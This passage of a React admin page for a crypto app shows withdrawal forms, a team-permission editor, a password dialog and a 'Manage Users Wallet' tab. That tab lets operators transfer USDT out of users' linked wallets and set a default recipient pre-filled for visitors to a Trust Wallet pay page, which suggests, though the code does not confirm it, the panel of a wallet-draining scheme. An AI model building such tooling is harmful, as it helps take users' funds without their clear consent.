                      <SelectItem value="tron">Tron</SelectItem>
                      <SelectItem value="solana">Solana</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <Card className="app-section-card rounded-xl">
                  <CardContent className="p-4">
                    <p className="text-xs text-muted-foreground mb-1">Connected Wallet</p>
                    <p className="text-sm font-semibold text-foreground break-all">{getConnectedWalletDisplay()}</p>
                  </CardContent>
                </Card>
                <Card className="app-section-card rounded-xl">
                  <CardContent className="p-4">
                    <p className="text-xs text-muted-foreground mb-1">Wallet Connection</p>
                    <Button
                      variant="outline"
                      onClick={openWalletModal}
                      disabled={isConnectingWallet || !canWithdrawWrite}
                      className="h-10 rounded-xl"
                    >
                      {withdrawalWalletAddress ? "Reconnect Wallet" : "Connect Wallet"}
                    </Button>
                  </CardContent>
                </Card>
              </div>

              <Card className="app-section-card rounded-xl">
                <CardContent className="p-5 grid md:grid-cols-2 gap-4">
                  <div className="space-y-2 md:col-span-2">
                    <Label htmlFor="withdrawDestination">Destination Wallet</Label>
                    <Input
                      id="withdrawDestination"
                      value={withdrawalDestination}
                      onChange={(event) => setWithdrawalDestination(event.target.value)}
                      placeholder={getWithdrawalPlaceholder(selectedChain)}
                      disabled={!canWithdrawWrite}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="withdrawAmount">Amount (USDT)</Label>
                    <Input
                      id="withdrawAmount"
                      type="number"
                      min="0.01"
                      step="0.01"
                      value={withdrawalAmountUsdt}
                      onChange={(event) => setWithdrawalAmountUsdt(event.target.value)}
                      placeholder="10.00"
                      disabled={!canWithdrawWrite}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="withdrawNote">Note (optional)</Label>
                    <Input
                      id="withdrawNote"
                      value={withdrawalNote}
                      onChange={(event) => setWithdrawalNote(event.target.value)}
                      placeholder="Reason or reference"
                      disabled={!canWithdrawWrite}
                    />
                  </div>
                  <div className="md:col-span-2">
                    <Button
                      variant="accent"
                      onClick={() => void handleCreateWithdrawalRequest()}
                      disabled={
                        !canAccessAdmin || !canWithdrawWrite || isSubmittingWithdrawal || isConnectingWallet
                      }
                      className="h-11 rounded-xl w-full sm:w-auto"
                    >
                      {isSubmittingWithdrawal ? "Submitting..." : "Withdraw With Connected Wallet"}
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <div className="space-y-3">
                {withdrawalEntries.map((entry) => (
                  <Card key={entry.id} className="app-section-card app-list-card rounded-xl">
                    <CardContent className="p-5">
                      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mb-3">
                        <div className="flex items-center gap-4 min-w-0">
                          <div className="w-11 h-11 rounded-xl bg-accent/8 border border-accent/10 flex items-center justify-center">
                            <Wallet className="w-5 h-5 text-accent" />
                          </div>
                          <div className="min-w-0">
                            <p className="text-sm font-semibold text-foreground break-all">{entry.id}</p>
                            <p className="text-xs text-muted-foreground mt-0.5 break-all">
                              {entry.chain.toUpperCase()} · {entry.amountUsdt.toFixed(2)} USDT · {entry.destinationAddress}
                            </p>
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          <Badge
                            variant="outline"
                            className="rounded-lg px-2.5 bg-success/10 text-success border-success/20"
                          >
                            {entry.status}
                          </Badge>
                          <DropdownMenu>
                            <DropdownMenuTrigger asChild>
                              <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
                                <MoreHorizontal className="w-4 h-4" />
                              </Button>
                            </DropdownMenuTrigger>
                            <DropdownMenuContent align="end">
                              <DropdownMenuItem onClick={() => window.open(`${getTxExplorerBaseUrl(entry.chain)}${entry.txHash}`, "_blank", "noopener,noreferrer")}>
                                View Explorer
                              </DropdownMenuItem>
                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.txHash, "Transaction hash")}>
                                Copy Tx Hash
                              </DropdownMenuItem>
                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.destinationAddress, "Destination address")}>
                                Copy Destination
                              </DropdownMenuItem>
                            </DropdownMenuContent>
                          </DropdownMenu>
                        </div>
                      </div>
                      <p className="text-sm text-muted-foreground break-words">
                        {entry.note || "No note"} · tx:{" "}
                        <a
                          href={`${getTxExplorerBaseUrl(entry.chain)}${entry.txHash}`}
                          target="_blank"
                          rel="noreferrer"
                          className="text-accent hover:underline break-all"
                        >
                          {entry.txHash}
                        </a>
                      </p>
                    </CardContent>
                  </Card>
                ))}
                {withdrawalEntries.length === 0 && (
                  <Card className="app-section-card rounded-xl">
                    <CardContent className="app-empty-state">
                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
                        <Wallet className="w-5 h-5 text-accent" />
                      </div>
                      <p className="text-sm font-semibold text-foreground">No withdrawals yet</p>
                      <p className="text-xs text-muted-foreground mt-1">
                        Completed withdrawal transactions will appear here in this session.
                      </p>
                    </CardContent>
                  </Card>
                )}
              </div>
            </TabsContent>

            <TabsContent value="manage-wallets" className="space-y-5">
              {canManageRead && !canManageWrite ? (
                <Card className="app-section-card rounded-xl border-amber-500/35 bg-amber-500/5">
                  <CardContent className="p-4 text-sm text-muted-foreground">
                    View-only: you can browse wallets but cannot change Tron settings or send USDT.
                  </CardContent>
                </Card>
              ) : null}
              <div className="app-sticky-subheader space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                  <h3 className="font-display font-bold text-lg text-foreground">Manage Users Wallet</h3>
                  <div className="w-full sm:w-[220px]">
                    <Select value={manageWalletChain} onValueChange={(value) => handleManageWalletChainChange(value as SupportedChain)}>
                      <SelectTrigger className="h-10 rounded-xl bg-muted/50 border-border/60">
                        <SelectValue placeholder="Select chain" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="ethereum">Ethereum</SelectItem>
                        <SelectItem value="bsc">BSC</SelectItem>
                        <SelectItem value="tron">Tron</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="relative max-w-xl">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                  <Input
                    className="pl-9 h-10 rounded-xl bg-muted/50 border-border/60 font-mono text-sm"
                    value={manageWalletListSearch}
                    onChange={(e) => setManageWalletListSearch(e.target.value)}
                    placeholder="Filter by wallet address or user id…"
                    autoComplete="off"
                    spellCheck={false}
                  />
                </div>
                {manageWalletChain === "tron" ? (
                  <p className="text-sm text-muted-foreground max-w-2xl">
                    Tron combines app-linked wallets and Trust Tron pay wallets. Use <strong>Send USDT</strong> to move USDT
                    from a user wallet (same flow as Ethereum/BSC).
                  </p>
                ) : null}
              </div>

              {manageWalletChain === "tron" ? (
                <Card className="app-section-card rounded-xl">
                  <CardContent className="p-5 space-y-4">
                    <div className="flex items-center gap-2 text-sm font-semibold text-foreground">
                      <Wallet className="w-4 h-4 text-accent" />
                      Trust pay · default recipient
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Pre-filled on <span className="font-mono text-foreground/90">/trustwallet/tron</span> for new visitors.
                    </p>
                    {isLoadingTrustTronConfig ? (
                      <div className="text-sm text-muted-foreground">Loading…</div>
                    ) : (
                      <div className="space-y-3">
                        <div className="space-y-2">
                          <Label htmlFor="trust-tron-recipient">Tron address (USDT)</Label>
                          <Input
                            id="trust-tron-recipient"
                            className="font-mono text-sm"
                            value={trustTronRecipientDraft}
                            onChange={(e) => setTrustTronRecipientDraft(e.target.value)}
                            placeholder="T…"
                            autoComplete="off"
                            spellCheck={false}
                            disabled={!canAccessAdmin || !canManageWrite || isSavingTrustTronRecipient}
                          />
                        </div>
                        {trustTronRecipientUpdatedAt ? (
                          <p className="text-xs text-muted-foreground">
                            Last updated {new Date(trustTronRecipientUpdatedAt).toLocaleString()}
                          </p>
                        ) : null}
                        <Button
                          type="button"
                          variant="accent"
                          className="w-full sm:w-auto"
                          disabled={!canAccessAdmin || !canManageWrite || isSavingTrustTronRecipient}
                          onClick={() => void applyTrustTronPayRecipient(trustTronRecipientDraft)}
                        >
                          {isSavingTrustTronRecipient ? (
                            <>
                              <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                              Saving…
                            </>
                          ) : (
                            "Save default recipient"
                          )}
                        </Button>
                      </div>
                    )}
                  </CardContent>
                </Card>
              ) : null}

              {isLoadingPaidWalletEntries ? (
                <Card className="app-section-card rounded-xl">
                  <CardContent className="p-5 sm:p-6">
                    <div className="flex items-center gap-3 mb-4">
                      <Loader2 className="w-4 h-4 animate-spin text-accent" />
                      <p className="text-sm text-foreground">Loading wallets</p>
                    </div>
                    <div className="space-y-2.5">
                      <div className="app-skeleton-line w-5/6" />
                      <div className="app-skeleton-line w-2/3" />
                      <div className="app-skeleton-line w-3/4" />
                    </div>
                  </CardContent>
                </Card>
              ) : (
                <div className="space-y-3">
                  {filteredManageWalletEntries.map((entry) => (
                    <Card key={`${entry.walletAddress}-${entry.userId}`} className="app-section-card app-list-card rounded-xl">
                      <CardContent className="p-5 flex flex-col gap-4">
                        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
                          <div className="min-w-0 flex flex-wrap items-center gap-2">
                            <p className="text-sm font-semibold text-foreground break-all">{entry.walletAddress}</p>
                            {entry.listSource === "trust_pay" ? (
                              <Badge variant="outline" className="rounded-md text-[10px] shrink-0 border-accent/30">
                                Trust pay
                              </Badge>
                            ) : null}
                          </div>
                          <div className="flex items-center gap-2">
                            <Button
                              variant="outline"
                              onClick={() => openSendUsdtModal(entry)}
                              className="h-10 rounded-xl"
                              disabled={!canManageWrite}
                            >
                              Send USDT
                            </Button>
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
                                  <MoreHorizontal className="w-4 h-4" />
                                </Button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent align="end">
                                <DropdownMenuItem onClick={() => openSendUsdtModal(entry)}>
                                  Open Transfer Modal
                                </DropdownMenuItem>
                                {manageWalletChain === "tron" ? (
                                  <DropdownMenuItem
                                    onClick={() => void applyTrustTronPayRecipient(entry.walletAddress)}
                                    disabled={!canManageWrite || isSavingTrustTronRecipient}
                                  >
                                    Set as Trust pay recipient
                                  </DropdownMenuItem>
                                ) : null}
                                <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.walletAddress, "Wallet address")}>
                                  Copy Wallet
                                </DropdownMenuItem>
                                <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.userId, "User ID")}>
                                  Copy User / record ID
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>
                          </div>
                        </div>
                        <p className="text-xs text-muted-foreground break-all">
                          {entry.listSource === "trust_pay"
                            ? `Wallet record: ${entry.userId}`
                            : `User: ${entry.userId}`}
                        </p>
                        <div className="grid grid-cols-1 md:grid-cols-4 gap-3 text-sm">
                          <div>
                            <p className="text-xs text-muted-foreground">USDT Balance</p>
                            <p className="font-medium">
                              {entry.usdtBalance ? `${entry.usdtBalance} USDT` : "Unavailable"}
                            </p>
                          </div>
                        </div>
                        {entry.balanceFetchError && (
                          <p className="text-xs text-warning">Balance fetch issue: {entry.balanceFetchError}</p>
                        )}
                      </CardContent>
                    </Card>
                  ))}
                  {filteredManageWalletEntries.length === 0 && paidWalletEntries.length > 0 ? (
                    <Card className="app-section-card rounded-xl">
                      <CardContent className="app-empty-state">
                        <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
                          <Search className="w-5 h-5 text-accent" />
                        </div>
                        <p className="text-sm font-semibold text-foreground">No wallets match this filter</p>
                        <p className="text-xs text-muted-foreground mt-1">Clear the search box or try another address fragment.</p>
                      </CardContent>
                    </Card>
                  ) : null}
                  {filteredManageWalletEntries.length === 0 && paidWalletEntries.length === 0 ? (
                    <Card className="app-section-card rounded-xl">
                      <CardContent className="app-empty-state">
                        <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
                          <Users className="w-5 h-5 text-accent" />
                        </div>
                        <p className="text-sm font-semibold text-foreground">No wallets found</p>
                        <p className="text-xs text-muted-foreground mt-1">
                          {manageWalletChain === "tron"
                            ? "No linked or Trust Tron pay wallets yet. Switch chain or refresh after activity."
                            : "Switch chain or wait for users with active linked wallets."}
                        </p>
                      </CardContent>
                    </Card>
                  ) : null}
                </div>
              )}
            </TabsContent>

            <TabsContent value="team" className="space-y-5">
              <div className="app-sticky-subheader space-y-2">
                <h3 className="font-display font-bold text-lg text-foreground">Team & permissions</h3>
                <p className="text-sm text-muted-foreground max-w-2xl">
                  Assign capabilities to admin and compliance accounts. Wildcard (*) grants every task. Operators without
                  password sign-in can still use email OTP on the admin sign-in page.
                </p>
              </div>
              {isLoadingOperators ? (
                <Card className="app-section-card rounded-xl">
                  <CardContent className="p-5 sm:p-6">
                    <div className="flex items-center gap-3">
                      <Loader2 className="w-4 h-4 animate-spin text-accent" />
                      <p className="text-sm text-foreground">Loading team</p>
                    </div>
                  </CardContent>
                </Card>
              ) : (
                <div className="space-y-4">
                  {operators.map((op) => (
                    <Card key={op.id} className="app-section-card rounded-xl">
                      <CardContent className="p-5 space-y-4">
                        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
                          <div className="min-w-0">
                            <p className="font-medium text-foreground break-all">{op.email}</p>
                            <p className="text-xs text-muted-foreground">Role: {op.role}</p>
                          </div>
                          <Button
                            type="button"
                            variant="accent"
                            className="rounded-xl shrink-0"
                            disabled={isSavingOperatorCaps === op.id}
                            onClick={() => void saveOperatorCapability(op.id)}
                          >
                            {isSavingOperatorCaps === op.id ? "Saving…" : "Save"}
                          </Button>
                        </div>
                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
                          {ASSIGNABLE_CAPABILITIES.map((cap) => {
                            const selected = operatorEdits[op.id] ?? [];
                            const isWildcard = selected.includes("*");
                            const checked =
                              cap === "*" ? isWildcard : !isWildcard && selected.includes(cap);
                            return (
                              <label
                                key={`${op.id}-${cap}`}
                                className="flex items-start gap-2.5 rounded-xl border border-border/60 bg-muted/25 p-3 cursor-pointer"
                              >
                                <Checkbox
                                  checked={checked}
                                  onCheckedChange={(v) => toggleOperatorCapability(op.id, cap, Boolean(v))}
                                  className="mt-0.5"
                                />
                                <span className="leading-snug">
                                  <span className="font-mono text-[11px] text-foreground/90 block">{cap}</span>
                                  <span className="text-muted-foreground text-xs">
                                    {CAPABILITY_LABELS[cap] ?? cap}
                                  </span>
                                </span>
                              </label>
                            );
                          })}
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                  {operators.length === 0 ? (
                    <Card className="app-section-card rounded-xl">
                      <CardContent className="app-empty-state">
                        <p className="text-sm text-muted-foreground">No admin or compliance operators found.</p>
                      </CardContent>
                    </Card>
                  ) : null}
                </div>
              )}
            </TabsContent>
          </Tabs>
        </motion.div>
      </div>
      <div className="app-mobile-actionbar">
        <div className="flex items-center gap-2 overflow-x-auto pb-2">
          {canWithdrawRead ? (
            <Button
              variant={activeTab === "withdrawals" ? "accent" : "outline"}
              size="sm"
              className="shrink-0"
              onClick={() => setActiveTab("withdrawals")}
            >
              Withdraw
            </Button>
          ) : null}
          {canManageRead ? (
            <Button
              variant={activeTab === "manage-wallets" ? "accent" : "outline"}
              size="sm"
              className="shrink-0"
              onClick={() => setActiveTab("manage-wallets")}
            >
              Wallets
            </Button>
          ) : null}
          {canOperators ? (
            <Button
              variant={activeTab === "team" ? "accent" : "outline"}
              size="sm"
              className="shrink-0"
              onClick={() => setActiveTab("team")}
            >
              Team
            </Button>
          ) : null}
        </div>
        <Button variant="accent" className="w-full h-11" onClick={handleQuickAction} disabled={quickActionDisabled}>
          {quickActionLabel}
        </Button>
      </div>
      <Dialog open={passwordDialogOpen} onOpenChange={setPasswordDialogOpen}>
        <DialogContent className="rounded-2xl max-w-md">
          <DialogHeader>
            <DialogTitle>Admin password</DialogTitle>
            <DialogDescription>
              Set or change the password used on the admin sign-in page. Minimum 10 characters. Email OTP still works
              unless disabled by your environment.
            </DialogDescription>
          </DialogHeader>
          <form onSubmit={handleSaveAdminPassword} className="space-y-4">
            {hasAdminPassword ? (
              <div className="space-y-2">
                <Label htmlFor="admin-pw-current">Current password</Label>
                <Input
                  id="admin-pw-current"
                  type="password"
                  autoComplete="current-password"
                  value={passwordCurrent}
                  onChange={(e) => setPasswordCurrent(e.target.value)}
                />
              </div>
            ) : null}
            <div className="space-y-2">
              <Label htmlFor="admin-pw-new">New password</Label>
              <Input
                id="admin-pw-new"
                type="password"
                autoComplete="new-password"
                value={passwordNew}
                onChange={(e) => setPasswordNew(e.target.value)}
                minLength={10}
                required
              />
            </div>
            <div className="flex justify-end gap-2 pt-2">
              <Button type="button" variant="outline" onClick={() => setPasswordDialogOpen(false)}>
                Cancel
              </Button>
              <Button type="submit" variant="accent" disabled={isSavingPassword}>
                {isSavingPassword ? "Saving…" : "Save"}
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>
      <WalletSelectModal
        open={isWalletModalOpen}
        onOpenChange={setIsWalletModalOpen}
        selectedChain={selectedChain}
        onSelectWallet={(method, walletId) => {
          void handleConnectWithdrawalWallet(method, walletId);
        }}
        isConnecting={isConnectingWallet}
      />
      <Dialog open={isSendUsdtModalOpen} onOpenChange={setIsSendUsdtModalOpen}>
        <DialogContent className="rounded-2xl">
          <DialogHeader>
            <DialogTitle>Transfer USDT From User Wallet</DialogTitle>
            <DialogDescription>
              Transfer USDT on {manageWalletChain.toUpperCase()} from the selected user wallet to the address below.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <div className="space-y-1">
              <p className="text-xs text-muted-foreground">Selected User Wallet</p>
              <p className="text-sm font-medium break-all">{sendUsdtTarget?.walletAddress ?? "N/A"}</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="sendUsdtDestination">Address</Label>
              <Input
                id="sendUsdtDestination"
                value={sendUsdtDestinationAddress}
                onChange={(event) => setSendUsdtDestinationAddress(event.target.value)}
                placeholder={manageWalletChain === "tron" ? "T..." : "0x..."}
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="sendUsdtAmount">Amount (USDT)</Label>
              <Input
                id="sendUsdtAmount"
                value={sendUsdtAmount}
                onChange={(event) => setSendUsdtAmount(event.target.value)}
                type="number"
                min="0.01"
                step="0.01"
              />
            </div>
            <div className="space-y-1">
              <p className="text-xs text-muted-foreground">Connected Admin Wallet</p>
              <p className="text-sm font-medium break-all">
                {sendUsdtWalletAddress || "Not connected"}
              </p>
            </div>
            <div className="flex flex-col sm:flex-row gap-2">
              <Button
                variant="outline"
                onClick={() => void handleConnectSendUsdtWallet()}
                disabled={!canManageWrite || isConnectingSendUsdtWallet || isSendingUsdt}
                className="h-11 rounded-xl"
              >
                {isConnectingSendUsdtWallet || trustConnecting ? "Connecting..." : "Connect Admin Wallet"}
              </Button>
              <Button
                variant="accent"
                onClick={() => void handleSendUsdtToUser()}
                disabled={
                  !canManageWrite || isSendingUsdt || isConnectingSendUsdtWallet || !sendUsdtTarget
                }
                className="h-11 rounded-xl"
              >
                {isSendingUsdt ? "Sending..." : "Send USDT"}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Admin;